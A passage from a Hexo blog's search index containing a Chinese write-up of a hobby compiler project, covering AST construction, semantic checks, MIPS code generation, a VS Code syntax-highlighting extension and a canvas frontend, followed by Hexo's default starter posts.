id="五ast生成">五、AST生成</h2><p>如下所示，在提前定义好的文法产生式做对应的规约动作，如下case0就是<code>Formals -&gt; int,TOKEN.ID</code>，在这里利用栈内的元素生成Formal_Class；就这样每次在对应的文法产生式上对对应的做规约动作，从而完成自底向上的ast的构建</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs node">[Formals -&gt; int, TOKEN.ID]: 0,<br>[Formals -&gt; Formals, &#x27;,&#x27;, int, TOKEN.ID]: 1<br><br>case 0:<br>  res = new Formal_Class(yyvalsp[0][2], yyvalsp[1][2]);<br>  break;<br>case 1:<br>  res = new Formal_Class(yyvalsp[0][2], yyvalsp[1][2], yyvalsp[3]);<br>  break;<br><br></code></pre></td></tr></table></figure><h2 id="六语义分析">六、语义分析</h2><p>在语义分析阶段可以做类型检查和基本的校验，这里放置了一些基本的类型检查动作：1. 必须要有main函数，main函数的返回值必须是整形 2.其他函数的返回值和实际返回值类型对应 3. 赋值语句左右两侧类型一致 4.同一个作用域不得出现同名变量 5. 变量必须先声明并初始化才能使用</p><h2 id="七汇编代码生成">七、汇编代码生成</h2><p>思路：自上向下进行利用堆栈机代码生成，仅使用了3个寄存器，a0，v0，t0，其中v0是辅助寄存器帮助函数返回值存储以及系统调用的退出和打印；总结了下，最重要的点是对声明变量的内存分配以及取变量的时候，要知道对应的作用域链，该从哪个作用取，只要我们对基本的一些单元表达式做好了代码生成的工作，后面就是搭积木的工作了；下面是该语言的函数栈示意图：<img src="../飞书20230502-104729.jpg" /></p><p>这里如何取参数？由于函数栈在扩增的时候，不太方便通过sp指针获取参数和变量的存储位置，所以这里使用fp指针去作为基地址，寻找参数和局部变量</p><p>关于作用域问题是采用的树结构存储(双向链表)，每次从当前所在作用域内寻找变量，再继续依次向上寻找，直到找到函数级作用域；</p><p>以下是具体的几个单元表达式生成的例子：</p><p>a + b lw $a0 局部 or 参数 / li $a0, imm sw $a0, 0($29) addiu $29,$29, -4 lw $a0 局部 or 参数 / li $a0, imm add $a0, $t0, $a0</p><p>对于int x = 2，直接用li命令存储，并在函数的局部变量处向函数栈内放置元素; 对于int x = a + b,先利用a+b元表达式生成对应的代码，再用lw指令存储单元表达式的值，</p><h2 id="八编写代码高亮语法插件">八、编写代码高亮语法插件：</h2><p>我这里是速成版，比较简单，只涉及简单的语法部分 需要安装：<figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cmake">$ npm <span class="hljs-keyword">install</span> -g vsce<br>$ npm <span class="hljs-keyword">install</span> -g yo<br></code></pre></td></tr></table></figure></p><p>如果是需要编写全新的插件，则允许： yo code 选择 new LanguageSupport，提示一些问题，按需填写即可，插件名称尽可能唯一，不然在插件市场里不好搜，运行完命令之后会有一个生成目录，编写高亮语法的文件在xxx.tmLanguage.json 文件里，如果你只是配置一个 VS Code中已有语言的语法，记得删掉生成的 package.json 中的 languages 配置。</p><p>https://www.bookstack.cn/read/VS-Code-Extension-Doc-ZH/docs-language-extensions-syntax-highlight-guide.md#fu57uu(编写插件vscode)</p><p>这里看下我的规则：</p><p>以及vscode里的settings.json文件： <figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-attr">&quot;editor.tokenColorCustomizations&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;[Default Dark+]&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span> <span class="hljs-comment">// 这里是自己所选择的主题颜色，我的是vscode默认的颜色</span><br>    <span class="hljs-attr">&quot;textMateRules&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>      <span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;scope&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;identifier.name&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-comment">// 自定义或者符合标准规范的命名，对应插件里的xxx.tmLanguage.json文件里的name选项</span><br>        <span class="hljs-attr">&quot;settings&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;foreground&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;#33ba8f&quot;</span><br>        <span class="hljs-punctuation">&#125;</span><br>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-punctuation">&#123;</span><br>      <span class="hljs-attr">&quot;scope&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;id.name.mc&quot;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;settings&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>          <span class="hljs-attr">&quot;foreground&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;#eb8328&quot;</span><br>      <span class="hljs-punctuation">&#125;</span><br>    <span class="hljs-punctuation">&#125;</span><br>    <span class="hljs-punctuation">]</span><br>  <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure>xxx.tmLanguage.json里的配置： <figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br><span class="hljs-attr">&quot;$schema&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;https://raw.githubusercontent.com/martinring/tmlanguage/master/tmlanguage.json&quot;</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;minic&quot;</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">&quot;patterns&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br><span class="hljs-punctuation">&#123;</span><br><span class="hljs-attr">&quot;include&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;#keywords&quot;</span><br><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-punctuation">&#123;</span><br>      <span class="hljs-attr">&quot;include&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;#type&quot;</span><br>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-punctuation">&#123;</span><br>      <span class="hljs-attr">&quot;include&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;#number&quot;</span><br>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-punctuation">&#123;</span><br>      <span class="hljs-attr">&quot;include&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;#id&quot;</span><br>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-punctuation">&#123;</span><br>      <span class="hljs-attr">&quot;include&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;#comment&quot;</span><br>    <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">&quot;repository&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br><span class="hljs-attr">&quot;patterns&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-punctuation">&#123;</span><br><span class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;support.type.primitive.mc&quot;</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">&quot;match&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;\\b(void|int|bool)\\b&quot;</span> <span class="hljs-comment">// 类型</span><br><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">]</span><br><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;keywords&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br><span class="hljs-attr">&quot;patterns&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-punctuation">&#123;</span><br><span class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;keyword.control.mc&quot;</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">&quot;match&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;\\b(if|while|for|return|else)\\b&quot;</span> <span class="hljs-comment">// 关键字</span><br><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">]</span><br><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;number&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br><span class="hljs-attr">&quot;patterns&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-punctuation">&#123;</span><br><span class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;constant.numeric.mc&quot;</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">&quot;match&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;\\b[0-9]+\\b&quot;</span> <br><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">]</span><br><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;id&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br><span class="hljs-attr">&quot;patterns&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-punctuation">&#123;</span><br><span class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;id.name.mc&quot;</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">&quot;match&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;\\b[a-z][a-z0-9]*\\b&quot;</span><br><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">]</span><br><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;comment&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br><span class="hljs-attr">&quot;patterns&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-punctuation">&#123;</span><br><span class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;comment.line.double-dash&quot;</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">&quot;match&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;^//.*&quot;</span> <span class="hljs-comment">//注释</span><br><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">]</span><br><span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">&quot;scopeName&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;source.mc&quot;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure></p><p>踩坑点：</p><ol type="1"><li><p>因为是根据分词 token那一套来的，其实也就是对你的语言的文件后缀名，比如我这里是 mc后缀，会做一个词法分析，词法分析的正则是自己编写的，然后每个正则也有对应的name，vscode 在配置(setting.json 文件)里可以根据这些 name做颜色的映射。所以一定要记得简单的正则要在两边加\b\b，表示单词分界，我一开始没加这个总是不生效</p></li><li><p>关于 name的命名，其实有一套规范的标准，当然也可以随心自定义，我这里的？？？就是自定义的。</p></li></ol><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-variable">$</span> <span class="hljs-built_in">cd</span> myExtension<br><span class="hljs-variable">$</span> vsce package<br><span class="hljs-comment"># 生成 myExtension.vsix,这时候本地可以看到一些二进制插件文件</span><br><span class="hljs-variable">$</span> vsce publish<br><br></code></pre></td></tr></table></figure><p>如果以前没有 vscode 插件市场的账户需要注册https://code.visualstudio.com/api/working-with-extensions/publishing-extension注册完之后，记得本地保存下密钥，因为会经常用的</p><p>取消发布的插件： vsce unpublish -p 密钥 包 id 包 id 可以在 vscode的对应插件的信息里可以看到，(一般点击插件的设置图标就可以看到包 id选项)</p><p>TextMate 语法最好对正则比较熟悉 具体的详细资料：https://code.visualstudio.com/api/language-extensions/semantic-highlight-guide#semantic-token-scope-map</p><p>https://macromates.com/manual/en/language_grammars#naming-conventions（TextMate语法规则）https://macromates.com/manual/en/regular_expressions（相关正则）</p><h2 id="九前端可视化">九、前端可视化</h2><p>canvas</p><p>项目踩坑点：</p><ol type="1"><li>我本地全局和项目下都是安装了 ts-nodede1，但是通过 npm runts-node，就是起不起来：Cannot find module'typescript'，后来在https://github.com/TypeStrong/ts-node/issues/707，好像是版本的问题，找到了最好的解决方案：npmlink typescript，再运行即可</li></ol><p>项目难点：其实整个项目是在学习斯坦福编译原理的时候有顺便一起写的，写下来也挺累的，因为已经在工作了，在编写本项目前，也看了下斯坦福的cool 源码，然后了解了下 bison 和flex，顺便对照了了下虎书的伪代码，下面总结下一些比较重要或者困难的点：</p><ol type="1"><li><p>正则表达式部分，这一部分纯粹自己手写，代码设计可能看着有点邋遢，主要思想是借鉴虎书上的，虎书只画了几个图，也没有给伪代码，主要是怎么设计nfa的节点相关数据结构存储，一个是是用简单的链表，后面发现可能存在出度为多个的节点，就换用邻接表存储了，每个节点的信息包含了所有入度边的信息；其次正则表达式分析这里用的也是stack 对正则表达式进行分析，栈内的元素可能是节点也可能是字符串，在每次pop的时候需要注意对当前出栈的节点进行遍历拿到头尾节点，方便节点之间的连接。然后是将各个nfa 联合成一个大 nfa 的过程，采用 dfa + bfa + 备忘录 + 回溯；最好是将nfa =&gt; dfa 的过程，这一部分参照伪代码的，应该没啥大问题；</p></li><li><p>ast 生成部分：这一步文法分析表生成是参照伪代码的，后面的 ast生成过程是纯手写，其实在实现的过程中，也发现整个过程和 bison 的 yy文件如出一辙，不知道 bison 是怎么实现的 😯，本来是想弄成简单的 bison文件编写文法规则的，但是时间不允许，后面再抽空看下。ast生成这一部分主要是在规约动作上放置一些用户定义动作，这里就是写死的生成对应文法表达式的类，自底向上构建ast</p></li><li><p>这比一部分理论其实挺多的，但是在本项目里只要考虑周到即可，防止在编译的最好阶段报错，也是纯手写的</p></li><li><p>汇编生成部分：这一部分个人觉得最恶心了，因为汇编比较难调试，每次有bug都需要汇编语句一句一句看，其实回过头看，这样把元表达式（像+-<em>/赋值语句）的寄存器分配设计写好了，就可以拿它们组合成更大的原件。这里也是纯手写的，有一个比较困扰我的点，像if-else里面声明的变量如何在运行时候分配内存？我们都知道局部变量在不考虑用寄存器优化的情况下，一般都是存储在栈内的，像参数都是基于fp(栈指针)进行寻址的，比如形式参数 x,y，在生成汇编的时候就要记录，这里我拿数组的[x, y]，这样 x 的偏移量就是fp + 1 </em> 4, y 就是 fp + 2 * 4，但是像 if else里面的声明的变量只有运行到对应的分支才能分配内存，也就是说另一个没有执行的分支是不需要分配内存的。</p></li><li><p>前端部分：用的是原生 canvas，主要是平时工作很少用canvas，之前学过，不用就忘，顺便学习下，主要是整个 canvas类的设计吧。</p></li></ol>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/emocoder/2023/02/27/hello-world/"/>
    <url>/emocoder/2023/02/27/hello-world/</url>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your veryfirst post. Check <a href="https://hexo.io/docs/">documentation</a> formore info. If you get any problems when using Hexo, you can find theanswer in <ahref="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> oryou can ask me on <ahref="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="quick-start">Quick Start</h2><h3 id="create-a-new-post">Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span><br></code></pre></td></tr></table></figure><p>More info: <ahref="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="run-server">Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="generate-static-files">Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></table></figure><p>More info: <ahref="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="deploy-to-remote-sites">Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo deploy<br></code></pre></td></tr></table></figure><p>More info: <ahref="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
    <categories>
      
      <category>Test</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>My New Post</title>
    <link href="/emocoder/2023/02/27/My-New-Post/"/>
    <url>/emocoder/2023/02/27/My-New-Post/</url>
    
    <content type="html"><![CDATA[<p>你好</p>]]></content>
    
    
    <categories>
      
      <category>Hexo</category>
      
    </categories>
    
    
  </entry>
  
  
  
  
</search>
